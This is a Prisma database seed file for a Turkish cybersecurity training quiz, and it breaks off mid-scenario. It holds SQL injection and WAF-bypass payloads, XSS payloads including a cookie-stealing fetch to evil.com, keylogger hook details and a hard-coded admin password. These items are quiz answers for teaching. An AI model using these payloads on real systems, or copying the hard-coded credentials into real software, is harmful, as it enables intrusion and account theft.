import { PrismaClient } from "@prisma/client";
import bcrypt from "bcryptjs";

const prisma = new PrismaClient();

async function main() {
  console.log("Seeding database...");

  const adminHash = await bcrypt.hash("PXolrde pablox3123*sssa", 12);
  await prisma.user.upsert({
    where: { email: "admin@cyberguard.local" },
    update: {},
    create: { email: "admin@cyberguard.local", name: "System Admin", passwordHash: adminHash, role: "ADMIN" },
  });

  const userHash = await bcrypt.hash("Demo@CyberGuard2024!", 12);
  await prisma.user.upsert({
    where: { email: "demo@cyberguard.dev" },
    update: {},
    create: { email: "demo@cyberguard.dev", name: "Demo User", passwordHash: userHash, role: "USER" },
  });

  const scenarios = [
    {
      slug: "phishing-technical",
      title: "Phishing - Teknik Analiz",
      description: "Email header analizi, SPF/DKIM/DMARC bypass teknikleri ve gerçek phishing kit anatomisi üzerine ileri seviye sorular.",
      category: "PHISHING",
      difficulty: "ADVANCED",
      isPublished: true,
      steps: JSON.stringify([
        {
          id: 1,
          title: "Email Header Analizi",
          content: `Aşağıdaki email header'ını inceleyin:

Received: from mail.paypa1-secure.ru (185.220.101.47)
Authentication-Results: spf=fail (domain: paypal.com)
DKIM-Signature: v=1; a=rsa-sha256; d=paypa1-secure.ru
Return-Path: <noreply@paypa1-secure.ru>
X-Originating-IP: 185.220.101.47
From: "PayPal Security" <security@paypal.com>
Reply-To: harvest@paypa1-secure.ru

Bu header'da kaç tane kritik red flag var ve en tehlikeli hangisi?`,
          choices: [
            { label: "4 red flag: SPF fail + domain mismatch (paypa1 vs paypal) + Reply-To harvesting + Tor exit node IP (185.220.101.x)", correct: true, consequence: "Mükemmel analiz! 185.220.101.x Tor exit node aralığıdır. SPF fail = domain sahibi bu IP'ye izin vermemiş. Reply-To farklı domain = credential harvesting. From görünen ad sahte, gerçek domain paypa1-secure.ru." },
            { label: "Sadece SPF fail önemli, diğerleri normal email davranışı", correct: false, consequence: "Yanlış. Her bir indicator bağımsız değerlendirilmemeli. Reply-To: harvest@ açıkça credential toplama amacı gösteriyor. Birden fazla indicator = kesin phishing." },
            { label: "DKIM imzası var, bu yüzden güvenli", correct: false, consequence: "Tehlikeli yanılgı! DKIM imzası paypa1-secure.ru domainine ait - yani saldırgan kendi domainini imzalamış. Bu güvenli olduğunu kanıtlamaz, sadece o domainden geldiğini kanıtlar." },
            { label: "Return-Path ve From aynı olmalı, bu tek sorun", correct: false, consequence: "Kısmi doğru ama yetersiz analiz. Return-Path/From uyumsuzluğu bir indicator ama Tor IP ve SPF fail çok daha kritik." }
          ],
          educationNote: "Email forensics: SPF, DKIM, DMARC üçlüsü birlikte değerlendirilmeli. 185.220.101.0/24 bloğu Tor exit node'larına ayrılmış. Reply-To harvesting en gözden kaçan taktiktir.",
          realWorldExample: "2020 SolarWinds saldırısında spear-phishing emaillerinde benzer header manipülasyonu kullanıldı. 18.000 kurum etkilendi."
        },
        {
          id: 2,
          title: "SPF Record Bypass",
          content: `Bir şirketin DNS kaydı:
v=spf1 include:_spf.google.com include:sendgrid.net ~all

Bu SPF kaydındaki kritik güvenlik açığı nedir?`,
          choices: [
            { label: "~all (softfail) yerine -all (hardfail) kullanılmalı. ~all ile SPF fail olan mailler yine de teslim edilebilir", correct: true, consequence: "Doğru! ~all softfail demektir - mail teslim edilir ama spam işaretlenebilir. -all hardfail ile SPF fail olan tüm mailler reddedilir. Büyük fark!" },
            { label: "Google ve SendGrid include'ları tehlikeli, kaldırılmalı", correct: false, consequence: "Yanlış. Meşru servis include'ları normal. Sorun ~all kullanımında." },
            { label: "SPF kaydı çok kısa, daha fazla include eklemeli", correct: false, consequence: "Tam tersi. SPF kaydı 10'dan fazla DNS lookup içeremez (RFC 7208). Daha fazla include eklenmemeli." },
            { label: "Bu SPF kaydı mükemmel, hiçbir sorun yok", correct: false, consequence: "Yanlış. ~all production ortamında kullanılmamalı. -all zorunlu." }
          ],
          educationNote: "SPF Qualifier'ları: +all (herkese izin ver - ASLA kullanma), ~all (softfail), -all (hardfail - doğru seçim), ?all (neutral). DMARC olmadan SPF tek başına yetersiz.",
          realWorldExample: "2019'da Capital One ihlalinde email güvenlik zafiyetleri saldırganın uzun süre fark edilmemesine yol açtı."
        },
        {
          id: 3,
          title: "Phishing Kit Tespiti",
          content: `Bir web sunucusunda aşağıdaki yapıyı buldunuz:

/var/www/html/
├── index.php (2.3MB - şüpheli büyüklük)
├── .htaccess
├── submit.php
├── assets/ (Bootstrap, jQuery - meşru görünüm)
└── .logs/
    └── results.txt (şifreli)

.htaccess içeriği:
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scan) [NC]
RewriteRule .* https://paypal.com [R=301,L]

Bu yapı hakkında en doğru analiz hangisidir?`,
          choices: [
            { label: ".htaccess bot/tarayıcı engelleme + submit.php credential toplama + .logs gizli dizin = klasik phishing kit. RewriteRule güvenlik araçlarını gerçek siteye yönlendiriyor", correct: true, consequence: "Mükemmel! Bu phishing kit'in imzası: Botları/tarayıcıları orijinal siteye yönlendirerek analiz araçlarını atlatır. submit.php çalınan verileri .logs'a yazar. index.php şişkin çünkü tüm HTML klonunu içeriyor." },
            { label: "Sadece .logs dizini şüpheli, diğerleri normal web sitesi yapısı", correct: false, consequence: "Yetersiz analiz. .htaccess'teki bot redirect en kritik indicator - meşru siteler güvenlik tarayıcılarını engellemez." },
            { label: "Bootstrap ve jQuery kullanımı meşruiyet göstergesi, tehdit yok", correct: false, consequence: "Yanlış. Phishing kitleri %100 gerçekçi görünmek için meşru framework'ler kullanır. Bu bir güvence değil, aksine daha sofistike bir kit olduğunu gösterir." },
            { label: "index.php büyüklüğü tek sorun, diğerleri normal", correct: false, consequence: "Kısmi. Büyük index.php şüpheli ama .htaccess bot bypass taktiği çok daha kritik bir indicator." }
          ],
          educationNote: "Phishing kit tespiti: VirusTotal, URLScan.io, ANY.RUN sandbox ile analiz. .htaccess bot redirect en yaygın kaçınma tekniği. Phishing kitleri genellikle 72 saat içinde kaldırılıp yeni domaine taşınır.",
          realWorldExample: "2021'de araştırmacılar 1.2 milyon phishing kit instance tespit etti. Ortalama ömrü 36 saat."
        },
        {
          id: 4,
          title: "DMARC Policy Analizi",
          content: `Bir şirketin DMARC kaydı:
_dmarc.sirket.com TXT "v=DMARC1; p=none; rua=mailto:dmarc@sirket.com; pct=100"

Saldırgan bu şirketi taklit eden email gönderdi ve başarılı oldu. Neden?`,
          choices: [
            { label: "p=none politikası sadece raporlama yapar, hiçbir emaili engellemez. p=quarantine veya p=reject olmalıydı", correct: true, consequence: "Kesinlikle doğru! p=none = 'izle ama engelleme'. p=quarantine = spam'e gönder. p=reject = tamamen reddet. Birçok şirket monitoring için p=none'da kalır ama bu production için tehlikeli." },
            { label: "pct=100 tüm emailleri etkiliyor, bu yüzden çok katı bir politika", correct: false, consequence: "Yanlış. pct=100 politikanın %100 emaile uygulanacağını söyler ama p=none politikası hala sadece rapor gönderir, engellemez." },
            { label: "rua rapor adresi yanlış yapılandırılmış", correct: false, consequence: "Yanlış. rua=mailto: doğru sözdizimi. Sorun p= değerinde." },
            { label: "DMARC kaydı çok uzun, basitleştirilmeli", correct: false, consequence: "Yanlış. Bu minimal bir DMARC kaydı. Uzunluk sorun değil, p=none kritik sorun." }
          ],
          educationNote: "DMARC Deployment: p=none → p=quarantine → p=reject şeklinde aşamalı geçiş önerilir. rua ile raporları analiz et, sonra quarantine'e geç. Büyük şirketler bile p=none'da takılıp kalıyor.",
          realWorldExample: "2021 araştırması: Fortune 500 şirketlerinin %65'i hala p=none kullanıyor. Bu şirketlerin domainleri kolayca taklit edilebilir."
        }
      ])
    },
    {
      slug: "sql-injection-advanced",
      title: "SQL Injection - İleri Seviye",
      description: "Union-based, blind, time-based SQLi teknikleri, WAF bypass ve gerçek exploit senaryoları.",
      category: "SQL_INJECTION",
      difficulty: "ADVANCED",
      isPublished: true,
      steps: JSON.stringify([
        {
          id: 1,
          title: "Union-Based SQLi Keşif",
          content: `Bir web uygulamasında şu URL savunmasız:
https://hedef.com/urun?id=1

Sütun sayısını bulmak için hangi payload doğru sırayla kullanılır?`,
          choices: [
            { label: "ORDER BY 1-- / ORDER BY 2-- / ORDER BY 3-- (hata gelene kadar) → sonra UNION SELECT NULL,NULL,NULL--", correct: true, consequence: "Doğru metodoloji! ORDER BY ile sütun sayısı bulunur (hata = o sayıda sütun yok). Sonra UNION SELECT ile NULL'larla veri tipi uyumunu test et. NULL her veri tipini kabul eder." },
            { label: "Direkt UNION SELECT 1,2,3,4,5-- ile başla", correct: false, consequence: "Verimsiz. Sütun sayısını bilmeden deneme yanılma yapmak çok zaman alır ve WAF'ı tetikler. Önce ORDER BY ile kesin sayıyı bul." },
            { label: "INFORMATION_SCHEMA.TABLES'a direkt sorgu at", correct: false, consequence: "UNION olmadan INFORMATION_SCHEMA'ya erişemezsiniz. Önce UNION çalışıyor mu ve kaç sütun var bunu belirlemeniz gerek." },
            { label: "' OR 1=1-- ile authentication bypass yap, sonra devam et", correct: false, consequence: "Auth bypass farklı bir teknik. Union-based extraction için sütun sayısı tespiti ilk adım olmalı." }
          ],
          educationNote: "SQLi Metodoloji: 1) Injection point tespiti 2) Sütun sayısı (ORDER BY) 3) Veri tipi uyumu (NULL) 4) Veritabanı versiyonu 5) Tablolar 6) Kolonlar 7) Veri extraction. Her adım öncekine bağlı.",
          realWorldExample: "2008 Heartland Payment Systems - Union-based SQLi ile 130M kredi kartı. Saldırgan Albert Gonzalez 20 yıl hapis cezası aldı."
        },
        {
          id: 2,
          title: "Blind Time-Based SQLi",
          content: `Uygulama hiçbir veri döndürmüyor ve hata mesajı yok. Sadece HTTP 200 veya 500 döndürüyor.

Veritabanının MySQL mi PostgreSQL mi olduğunu nasıl anlarsınız?`,
          choices: [
            { label: "MySQL: 1'; IF(1=1, SLEEP(5), 0)-- | PostgreSQL: 1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", correct: true, consequence: "Mükemmel! Her veritabanının timing fonksiyonu farklı: MySQL=SLEEP(), PostgreSQL=pg_sleep(), MSSQL=WAITFOR DELAY, Oracle=dbms_pipe.receive_message(). 5 saniye gecikme = koşul doğru = o DB türü." },
            { label: "Her ikisinde de SLEEP(5) çalışır, fark yok", correct: false, consequence: "Yanlış. PostgreSQL'de SLEEP() fonksiyonu yoktur. pg_sleep() kullanılmalı. Yanlış fonksiyon = hata veya sonuç yok." },
            { label: "VERSION() fonksiyonu her veritabanında aynı çalışır", correct: false, consequence: "Yanlış. Blind SQLi'de output göremezsiniz. VERSION() sonucunu görmek için önce timing veya boolean channel kurmanız gerek." },
            { label: "Blind SQLi'de veritabanı türü tespit edilemez", correct: false, consequence: "Yanlış. Timing farkları, hata mesajları ve syntax farklılıkları ile DB türü tespit edilebilir. SQLMap bunu otomatik yapar." }
          ],
          educationNote: "Time-based blind SQLi çok yavaştır (bit bit veri çeker). SQLMap --technique=T ile otomatize edilebilir. Savunma: Tüm DB hata mesajlarını gizle, query timeout uygula, rate limiting ekle.",
          realWorldExample: "2015 TalkTalk ihlali blind SQLi ile gerçekleşti. 157K müşteri verisi çalındı, 17 yaşındaki saldırgan tutuklandı."
        },
        {
          id: 3,
          title: "WAF Bypass Teknikleri",
          content: `Hedef sistemde ModSecurity WAF var. Normal UNION SELECT payloadı engellenıyor.

Aşağıdaki bypass tekniklerinden hangisi en etkili kombinasyonu oluşturur?`,
          choices: [
            { label: "/*!UNION*/ /*!SELECT*/ + URL encoding (%55%4E%49%4F%4E) + yorum ekleme (UN/**/ION) kombinasyonu", correct: true, consequence: "Doğru! MySQL inline comment (/*!*/) WAF'ı atlatan klasik teknik. URL encoding ikinci katman. UN/**/ION keyword splitting üçüncü katman. Kombinasyon kullanımı WAF imza eşleşmesini zorlaştırır." },
            { label: "Büyük harf kullanmak yeterli: UNION SELECT yerine uNiOn SeLeCt", correct: false, consequence: "Yetersiz. Modern WAF'lar case-insensitive çalışır. Sadece case değiştirmek 2010'da işe yarardı." },
            { label: "Yavaş göndermek (slowloris) WAF'ı bypass eder", correct: false, consequence: "Yanlış. Slowloris DoS tekniğidir, SQLi bypass ile ilgisi yok. WAF payload'u analiz eder, hızı değil." },
            { label: "HTTPS kullanmak WAF'ı devre dışı bırakır", correct: false, consequence: "Yanlış. Modern WAF'lar (Cloudflare, AWS WAF) SSL termination yaparak şifreli trafiği de inceleyebilir." }
          ],
          educationNote: "WAF Bypass savunma perspektifi: Sadece imza tabanlı WAF yetersiz. Davranış analizi + rate limiting + anomaly detection kombinasyonu gerekli. WAF bypass araçları: sqlmap --tamper=space2comment,between,randomcase",
          realWorldExample: "2021 Accellion FTA - WAF bypass edilmiş SQLi. Morgan Stanley, Shell, Kroger dahil 100+ kurum etkilendi."
        },
        {
          id: 4,
          title: "Second-Order SQL Injection",
          content: `Bir kullanıcı kayıt formunda username alanına şunu girdiyseniz:
admin'--

Kayıt başarılı oldu çünkü kayıt kodu parametrize edilmiş. Ama sonra profil güncelleme sayfasında ne olabilir?`,
          choices: [
            { label: "Profil güncelleme kodu veritabanından username'i çekip SQL sorgusuna ekleyebilir: UPDATE users SET email='x' WHERE username='admin'--' → admin hesabı güncellenir", correct: true, consequence: "İşte Second-Order SQLi! Girdi kaydedilirken güvenli ama veritabanından çekilip tekrar kullanıldığında tehlikeli. Çok gözden kaçan bir açık türü. Tüm DB'den okunan değerler de sanitize edilmeli." },
            { label: "Kayıt güvenli geçti, artık tehlike yok", correct: false, consequence: "Yanlış. Second-Order SQLi tam olarak bu varsayımı istismar eder. 'Veritabanında güvenli saklıyoruz' yeterli değil - kullanıldığında da güvenli olmalı." },
            { label: "admin'-- geçersiz username, sistem hata verir", correct: false, consequence: "Sisteme bağlı. Bazı sistemler bu karakterlere izin verir. Güvenli sistemlerde bile second-order riski var." },
            { label: "SQL injection sadece input alanlarında çalışır, DB'den gelen veri güvenlidir", correct: false, consequence: "Bu yanlış inanç second-order SQLi'yi mümkün kılar. Kaynağı ne olursa olsun, SQL sorgusuna eklenen her değer parametrize edilmeli." }
          ],
          educationNote: "Second-Order SQLi tespiti: Statik analiz araçları genellikle kaçırır. Manuel code review veya özel DAST araçları gerektirir. Fix: DB'den okunan değerler bile parametrize sorgu kullan.",
          realWorldExample: "HackerOne bug bounty raporlarında second-order SQLi kritik bulgu olarak sık karşılaşılan bir açık türü."
        }
      ])
    },
    {
      slug: "xss-advanced",
      title: "XSS - Cross-Site Scripting",
      description: "DOM-based XSS, CSP bypass, stored XSS exploitation ve modern tarayıcı savunmalarını aşma teknikleri.",
      category: "PHISHING",
      difficulty: "ADVANCED",
      isPublished: true,
      steps: JSON.stringify([
        {
          id: 1,
          title: "DOM-Based XSS Tespiti",
          content: `Aşağıdaki JavaScript kodu incelendiğinde:

var search = document.location.hash.substring(1);
document.getElementById('result').innerHTML = search;

Hangi URL bu kodu exploit eder?`,
          choices: [
            { label: "https://site.com/page#<img src=x onerror=fetch('//evil.com?c='+document.cookie)>", correct: true, consequence: "Doğru! innerHTML doğrudan hash'i yazıyor. img onerror handler her tarayıcıda çalışır ve src=x intentionally fail ediyor. Fetch ile cookie exfiltration DOM-based XSS'in klasik kullanımı." },
            { label: "https://site.com/page?search=<script>alert(1)</script>", correct: false, consequence: "Bu Reflected XSS denemesi. Kod location.hash kullanıyor, query string değil. ? ile gelen parametre bu kodda işlenmez." },
            { label: "https://site.com/page#javascript:alert(1)", correct: false, consequence: "javascript: protokolü innerHTML'de çalışmaz. Modern tarayıcılar bu vektörü engeller. img onerror veya svg onload daha güvenilir." },
            { label: "Bu kod XSS'e karşı güvenli, innerHTML zararsız", correct: false, consequence: "Kesinlikle yanlış! innerHTML kullanıcı kontrolündeki veri ile kullanıldığında en tehlikeli DOM API'lerinden biridir. textContent kullanılmalıydı." }
          ],
          educationNote: "DOM XSS Sources: document.location, document.URL, document.referrer, window.name. DOM XSS Sinks: innerHTML, outerHTML, document.write, eval(). textContent ve setAttribute güvenli alternatifler.",
          realWorldExample: "2018 British Airways - DOM XSS ile ödeme sayfasına script inject edildi. 500K kart çalındı, £183M GDPR cezası."
        },
        {
          id: 2,
          title: "CSP Bypass Teknikleri",
          content: `Hedef sitenin Content-Security-Policy header'ı:
script-src 'self' https://cdn.jsdelivr.net 'nonce-abc123'

Bu CSP'yi bypass etmenin en geçerli yolu hangisi?`,
          choices: [
            { label: "cdn.jsdelivr.net'te host edilen meşru bir JS dosyasını (AngularJS gibi) JSONP endpoint olarak kullanarak script çalıştırma", correct: true, consequence: "Doğru! CDN whitelist bypass klasik teknik. cdn.jsdelivr.net'teki herhangi bir JSONP endpoint veya AngularJS ng-src gibi template injection noktaları CSP'yi bypass edebilir. CSP whitelist yaklaşımı bu yüzden güvenilmez." },
            { label: "inline script kullanmak CSP'yi otomatik devre dışı bırakır", correct: false, consequence: "Yanlış. 'unsafe-inline' yoksa inline script tamamen engellenir. nonce olmayan inline script çalışmaz." },
            { label: "HTTPS kullanmak script-src kısıtlamalarını kaldırır", correct: false, consequence: "Yanlış. Protocol CSP politikasını etkilemez. script-src domain bazlı kontrol eder." },
            { label: "Bu CSP bypass edilemez, mükemmel yapılandırma", correct: false, consequence: "Yanlış. CDN whitelist büyük risk. Google, Twitter gibi CDN'ler bile JSONP endpoint'leri nedeniyle CSP bypass vektörü oluşturabilir." }
          ],
          educationNote: "Güvenli CSP: Whitelist yerine nonce veya hash kullan. 'strict-dynamic' ile nonce güvenilir script'lere geçiş sağlar. report-uri ile ihlalleri izle. CSP Evaluator (Google) ile test et.",
          realWorldExample: "2016'da araştırmacılar github.com dahil büyük sitelerde CDN whitelist bypass buldu. CSP geçmişe yönelik en büyük yanılgılardan biri."
        },
        {
          id: 3,
          title: "Stored XSS - Session Hijacking",
          content: `Bir forum sitesinde stored XSS buldunuz. Admin paneli aynı domain'de çalışıyor ve admin her 10 dakikada bir yeni yorumları kontrol ediyor.

En etkili exploitation zinciri hangisi?`,
          choices: [
            { label: "XHR ile admin'in CSRF token'ını çek → token ile admin işlemi yap → yeni admin hesabı oluştur (account takeover)", correct: true, consequence: "En sofistike yaklaşım! Sadece cookie çalmak yeterli değil (HttpOnly olabilir). Aynı domain'de çalışan script CSRF token'a erişebilir. Token ile admin eylemler yapılabilir. Bu persistence sağlar." },
            { label: "document.cookie ile session cookie'yi çal ve kendi tarayıcında kullan", correct: false, consequence: "Kısmi doğru ama yetersiz. Modern uygulamalar HttpOnly cookie kullanır - document.cookie bunu göremez. Ayrıca session fixation korumaları olabilir." },
            { label: "Alert(1) ile XSS varlığını kanıtla ve raporu kapat", correct: false, consequence: "PoC için yeterli ama real-world impact göstermiyor. Bug bounty'de dahi sadece alert(1) düşük ödeme alır, exploitation chain göstermek gerekir." },
            { label: "Keylogger ekleyerek admin'in şifresini bekle", correct: false, consequence: "Mümkün ama yavaş ve unreliable. Admin şifre alanına her girmeyebilir. CSRF chain daha hızlı ve garantili." }
          ],
          educationNote: "XSS Impact Zinciri: XSS → CSRF token çal → Admin eylem → Persistent backdoor. BeEF (Browser Exploitation Framework) bu zinciri otomatize eder. Fix: HttpOnly+Secure cookie + CSP + SameSite=Strict.",
          realWorldExample: "2011 Samy Worm - MySpace'te stored XSS, 1 milyon profili 20 saatte enfekte etti. Tek satır JS ile viral yayılım."
        },
        {
          id: 4,
          title: "XSS Filter Evasion",
          content: `Uygulama şu karakterleri filtreliyor:
< > " ' script alert

Aşağıdaki payload'lardan hangisi bu filtreyi geçer?`,
          choices: [
            { label: "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", correct: true, consequence: "Doğru! svg tag'i filtrelenmemiş. onload handler script/alert içermiyor. String.fromCharCode ile 'alert(1)' oluşturuluyor. Karakter filtresi bypass için encoding en güvenilir yöntem." },
            { label: "<SCRIPT>ALERT(1)</SCRIPT> büyük harf kullanmak filtreyi geçer", correct: false, consequence: "Yanlış. Uygulama büyük/küçük harf duyarsız filtreleme yapıyorsa geçmez. Ayrıca 'script' ve 'alert' direkt olarak filtreleniyor." },
            { label: "javascript:alert(1) href içinde çalışır, filtreyi geçer", correct: false, consequence: "javascript: protokolü modern tarayıcılarda href'te çalışmaz ve < > filtresi href attribute enjeksiyonunu zaten engeller." },
            { label: "Bu filtreler mükemmel, bypass mümkün değil", correct: false, consequence: "Yanlış. Blacklist yaklaşımı her zaman bypass edilebilir. svg, img, iframe, input, body gibi onload/onerror destekleyen yüzlerce HTML elementi var." }
          ],
          educationNote: "XSS Filter Evasion: HTML5 ile 150+ event handler var. Blacklist asla güvenli değil. Whitelist + HTML encoding + DOMPurify doğru yaklaşım. XSS Cheat Sheet: portswigger.net/web-security/cross-site-scripting/cheat-sheet",
          realWorldExample: "2019'da araştırmacı Google'ın XSS filtresini SVG animasyonu ile bypass etti. $13,337 bug bounty ödüldü."
        }
      ])
    },
    {
      slug: "keylogger-technical",
      title: "Keylogger & Malware Analizi",
      description: "Windows API hooking, kernel-mode keylogger mimarisi, memory forensics ve EDR evasion teknikleri.",
      category: "KEYLOGGER",
      difficulty: "ADVANCED",
      isPublished: true,
      steps: JSON.stringify([
        {
          id: 1,
          title: "Windows Keyboard Hook Mekanizması",
          content: `Windows'ta low-level keyboard hook kurmak için hangi API çağrısı kullanılır ve hangi hook type gerekir?`,
          choices: [
            { label: "SetWindowsHookEx(WH_KEYBOARD_LL=13, LowLevelKeyboardProc, hInstance, 0) - thread ID 0 = global hook", correct: true, consequence: "Doğru! WH_KEYBOARD_LL (13) tüm sistemdeki klavye girdilerini yakalar. Thread ID 0 = global, tüm process'leri etkiler. LowLevelKeyboardProc callback her tuş vuruşunda tetiklenir. GetMessage veya PeekMessage loop gerektirir." },
            { label: "RegisterHotKey() API ile tüm tuşları yakalayabilirsiniz", correct: false, consequence: "Yanlış. RegisterHotKey sadece önceden tanımlanmış hotkey kombinasyonlarını yakalar, genel keyboard logging için kullanılamaz." },
            { label: "ReadConsoleInput() ile tüm sistem tuş vuruşları okunur", correct: false, consequence: "Yanlış. ReadConsoleInput sadece konsol uygulamalarının kendi input buffer'ını okur. Sistem geneli hook yapamaz." },
            { label: "DirectInput (DirectX) en etkili keyboard capture yöntemidir", correct: false, consequence: "Yanlış. DirectInput oyun controller'ları içindir. Sistem geneli keyboard logging için SetWindowsHookEx gerekir." }
          ],
          educationNote: "Savunma: EDR'lar SetWindowsHookEx çağrılarını izler. Kernel-mode keylogger'lar bu tespiti atlatır. Process Monitor ile hook'ları görüntüle. API monitoring tools: API Monitor, Frida, DynamoRIO.",
          realWorldExample: "Zeus banking trojan tam olarak bu API kullandı. 2010'da 70+ ülkede 3.6M sistem enfekte etti."
        },
        {
          id: 2,
          title: "Process Injection Tespiti",
          content: `Bir sistemde anormal davranış inceleniyor. Process Explorer'da şunu görüyorsunuz:

notepad.exe (PID: 4821)
└── Loaded DLLs:
    ├── ntdll.dll (normal)
    ├── kernel32.dll (normal)  
    ├── C:\\Windows\\System32\\msvcrt.dll (normal)
    └── C:\\Users\\user\\AppData\\Temp\\kb_hook.dll (ŞÜPHELİ)

kb_hook.dll'nin network bağlantısı var: 185.220.101.47:443

Bu durumda en doğru analiz ve aksiyon hangisidir?`,
          choices: [
            { label: "DLL injection tespit edildi. notepad.exe'yi kill et, kb_hook.dll'yi sandbox'ta analiz et (ANY.RUN/Cuckoo), C2 IP'yi (185.220.101.47) firewall'da engelle, memory dump al", correct: true, consequence: "Doğru incident response! AppData\\Temp'teki DLL şüpheli. Tor exit node IP (185.220.101.47) C2 server işareti. Memory dump önce al sonra process kill et - aksi halde kanıt kaybolur. Sandbox analizi için hash al." },
            { label: "notepad.exe güvenli uygulama, DLL'ler önemsiz, ağ trafiği normaldir", correct: false, consequence: "Tehlikeli! AppData\\Temp'ten yüklenen DLL + Tor exit node bağlantısı = kesin compromise indicator. Hiçbir meşru DLL Temp klasöründen yüklenmez." },
            { label: "Antivirüs taraması yap ve temizlenmesini bekle", correct: false, consequence: "Yetersiz. Memory-only malware veya AV-aware malware tespit edilmeyebilir. Proaktif analiz şart. Ayrıca C2 bağlantısı devam ediyor." },
            { label: "kb_hook.dll'yi sil ve bilgisayarı yeniden başlat", correct: false, consequence: "Yanlış sıra! Önce memory dump ve forensic kanıt toplanmalı. Sil ve reboot = tüm volatile evidence kaybolur. Rootkit persistence mekanizması da temizlenmemiş olur." }
          ],
          educationNote: "DLL Injection Tespiti: Process Explorer, Hollows Hunter, Moneta. Memory Forensics: Volatility framework ile process injection analizi. YARA rules ile malware imzası oluştur.",
          realWorldExample: "2017 NotPetya - EternalBlue + DLL injection kombinasyonu. $10 milyar global hasar. Maersk, Merck, FedEx etkilendi."
        },
        {
          id: 3,
          title: "EDR Evasion Tekniği Tespiti",
          content: `Bir malware örneği incelendiğinde şu davranış tespit edildi:

1. NtCreateFile yerine direkt syscall numarası kullanıyor (syscall 0x55)
2. EDR hook'lu ntdll.dll yerine disk'ten fresh copy yüklüyor  
3. Sleep() çağrısı + timing check (sanal makine tespiti)

Bu teknikler hangi kategoride değerlendiri?`,
          choices: [
            { label: "Direct syscall (Hell's Gate) + DLL unhooking + Anti-VM = modern EDR evasion trifecta. Kernel-level detection gerektirir", correct: true, consequence: "Mükemmel analiz! Direct syscall: EDR user-mode hook'larını atlar. DLL unhooking: EDR'ın inject ettiği hook'ları temizler. Anti-VM: Sandbox analizi engeller. Bu üçlü kombinasyon çoğu EDR'ı atlatır. Sadece kernel-mode EDR (CrowdStrike Falcon, SentinelOne) tespit edebilir." },
            { label: "Bunlar normal Windows uygulama davranışları, malware değil", correct: false, consequence: "Yanlış. Hiçbir meşru uygulama direct syscall + DLL unhooking + anti-VM kombinasyonu kullanmaz. Bu davranış profili kesin malware göstergesi." },
            { label: "Sadece Sleep() çağrısı şüpheli, diğerleri normal optimizasyon", correct: false, consequence: "Yetersiz analiz. Direct syscall tek başına EDR bypass amacı taşır. Kombinasyon sophisticated threat actor göstergesi." },
            { label: "Anti-VM yeterli savunma, VM'de çalıştırılırsa zararsız", correct: false, consequence: "Yanlış. Anti-VM sadece sandbox analizini zorlaştırır, malware'in zararını azaltmaz. Production'da VM olmayan sistemlerde tam çalışır." }
          ],
          educationNote: "Modern Malware Evasion: Hell's Gate/Halo's Gate (direct syscall), stomped modules, sleep obfuscation. Karşı önlem: Kernel ETW telemetry, hardware breakpoints, memory scanning. Referans: MITRE ATT&CK T1055, T1562.",
          realWorldExample: "Cobalt Strike Beacon bu tekniklerin birçoğunu kullanır. 2021'de ransomware gruplarının %70'i Cobalt Strike kullandı."
        },
        {
          id: 4,
          title: "Memory Forensics - Malware Tespiti",
          content: `Volatility ile Windows memory dump analizi yapılıyor:

$ volatility -f memory.dmp --profile=Win10x64 pslist
notepad.exe  4821  explorer.exe  (normal)

$ volatility -f memory.dmp --profile=Win10x64 malfind
Process: notepad.exe PID: 4821
VAD: 0x1f0000-0x21f000
Protection: PAGE_EXECUTE_READWRITE
Hexdump: 4D 5A 90 00 (MZ header - PE file!)

Bu bulgu ne anlama gelir?`,
          choices: [
            { label: "notepad.exe'nin belleğinde PAGE_EXECUTE_READWRITE + MZ header = process hollowing veya reflective DLL injection. Meşru process bellekte gizli PE dosyası barındırıyor", correct: true, consequence: "Doğru forensics analizi! PAGE_EXECUTE_READWRITE anormal: Normal kod read+execute, data write+read. Üçünün birlikte olması shellcode/inject göstergesi. MZ header (4D 5A) = Windows PE dosyası. Process hollowing: meşru process boşaltılıp malware inject edilir." },
            { label: "MZ header normal DLL yüklemesidir, tehdit yok", correct: false, consequence: "Yanlış. Meşru DLL'ler Load Address'te görünür ve PAGE_EXECUTE_READ olur. Execute+Write+Read kombinasyonu self-modifying code işareti - kesinlikle anormal." },
            { label: "Volatility false positive üretiyor, güvenilmez araç", correct: false, consequence: "Yanlış. Volatility en güvenilir memory forensics araçlarından biri. malfind plugin PE injection tespitinde çok güvenilir." },
            { label: "Bu sadece notepad'in normal bellek yönetimi", correct: false, consequence: "Yanlış. notepad.exe gibi basit bir text editörün belleğinde execute+write bölgesi ve PE header olmamalı. Kesin compromise." }
          ],
          educationNote: "Volatility Komutları: pslist/pstree (process), malfind (injection), netscan (network), dlllist (DLL), cmdline (komut satırı). YARA ile memory scanning. Referans: The Art of Memory Forensics kitabı.",
          realWorldExample: "2020 Sunburst (SolarWinds) malware Volatility ile analiz edildi. Memory forensics sayesinde tam attack chain ortaya çıkarıldı."
        }
      ])
    },
    {
      slug: "network-security",
      title: "Ağ Güvenliği & MITM",
      description: "ARP poisoning, SSL stripping, Wireshark analizi ve ağ saldırı tespiti üzerine teknik sorular.",
      category: "SOCIAL_ENGINEERING",
      difficulty: "ADVANCED",
      isPublished: true,
      steps: JSON.stringify([
        {
          id: 1,
          title: "ARP Poisoning Mekanizması",
          content: `Aşağıdaki Wireshark çıktısını inceleyin:

No.  Source              Destination   Protocol  Info
1    00:0c:29:aa:bb:cc   Broadcast     ARP       Who has 192.168.1.1? Tell 192.168.1.50
2    00:0c:29:aa:bb:cc   Broadcast     ARP       Who has 192.168.1.1? Tell 192.168.1.50
3    00:0c:29:aa:bb:cc   Broadcast     ARP       Who has 192.168.1.1? Tell 192.168.1.50
(Her 0.5 saniyede tekrar ediyor)

Gateway'in gerçek MAC: 00:50:56:c0:00:08
ARP cache'de görünen: 192.168.1.1 → 00:0c:29:aa:bb:cc

Bu durum ne gösteriyor?`,
          choices: [
